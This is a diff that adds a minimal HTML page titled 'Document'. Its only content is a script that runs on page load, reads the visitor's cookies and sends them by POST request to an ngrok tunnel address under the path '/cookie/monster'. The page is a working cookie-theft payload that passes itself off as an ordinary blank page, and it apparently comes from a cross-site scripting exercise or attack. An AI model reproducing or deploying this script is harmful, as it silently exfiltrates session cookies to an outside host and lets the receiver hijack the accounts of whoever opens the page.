@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+
+        var x = document.cookie; 
+        var url = "https://cf12aaa589df.ngrok.io"
+        var xhttp = new XMLHttpRequest();
+        xhttp.open('POST', url+'/cookie/monster')
+        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
+        
+        xhttp.send("cookie="+x)
+
+        
+    </script>
+</body>
+</html>
